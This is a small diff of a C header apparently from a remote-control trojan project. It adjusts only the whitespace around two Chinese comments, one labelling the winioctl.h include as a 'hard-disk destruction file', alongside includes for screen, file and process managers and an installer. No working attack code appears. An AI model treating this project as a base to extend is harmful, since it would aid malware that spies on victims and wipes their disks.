@@ -2,7 +2,7 @@
 #define AFX_LOOP_H_INCLUDED
 
 #include "../StdAfx.h"
-#include "../Declare.h"   //动态调用库函数
+#include "../Declare.h"		//动态调用库函数
 #include "KernelManager.h"
 #include "FileManager.h"
 #include "ScreenManager.h"
@@ -18,7 +18,7 @@
 #include <wininet.h>
 #include "install.h"
 #include <tlhelp32.h>
-#include <winioctl.h>   //硬盘毁灭文件
+#include <winioctl.h>		//硬盘毁灭文件
 #include "../Myfunction.h"  //自定义函数
 
 extern Myfunction *Gyfunction;
